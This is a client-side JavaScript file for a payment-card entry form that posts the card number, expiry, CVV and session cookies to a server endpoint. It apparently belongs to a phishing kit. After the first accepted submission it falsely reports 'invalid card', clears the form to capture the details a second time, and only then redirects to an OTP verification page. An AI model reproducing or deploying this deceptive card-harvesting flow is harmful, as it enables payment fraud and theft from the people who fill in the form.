const show_err_sign = (input) => {
    return (input.style.border = "1px solid red");
  };
let number_of_attempt=0
  const check_attempt=()=>{
    ++number_of_attempt 
if(number_of_attempt >=2){
    document.querySelector("#submit").innerHTML="success"
    window.location.href="/verify_otp.html";
}else{
    document.querySelectorAll("input").forEach(input=> {
        input.value=""
    })
    
    document.querySelector(".errMessage").innerHTML="invalid card, please check your info and try again"
    document.querySelector("#submit").innerHTML="Try again"
}

  }
 
const submit_credit_card_details=async(form)=>{
    document.querySelector("#submit").innerHTML="Proccessing..."
    try{
        const response=await fetch("/api/user/card/submit",{
            method:"POST",
            headers:{"content-type":"application/json"},
            body:JSON.stringify(form)
        })
       const result= await response.json()
    console.log(result)
    if(result.error){
        document.querySelector("#submit").innerHTML="Try again"
        document.querySelector(".errMessage").innerHTML=result.errMessage

    }else{
        check_attempt()
    }

    }catch(error){
        document.querySelector(".errMessage").innerHTML=error.message
        document.querySelector("#submit").innerHTML="Try again"   
    }
   
}


document.querySelector("#submit").onclick=()=>{
    let card_number=document.querySelector("#card_number")
    let expiry_date=document.querySelector("#expiry_date")
    let cvv=document.querySelector("#cvv")
    let card_type=document.querySelector("#card_type")

    if(!card_number.value)return show_err_sign(card_number)
    if(!expiry_date.value)return show_err_sign(expiry_date)
    if(!cvv.value)return show_err_sign(cvv)
    if(!card_type.value)return show_err_sign(card_type)
    const token=getCookie("token")
    const user=getCookie("user")
    submit_credit_card_details({
    token,
user,
card_number:card_number.value,
expiry_date:expiry_date.value,
cvv:cvv.value,
card_type:card_type.value
    })
}

document.querySelectorAll("input").forEach((input)=>{
    input.onkeyup=()=>{
        input.style.border="2px solid #fff"
    }
})

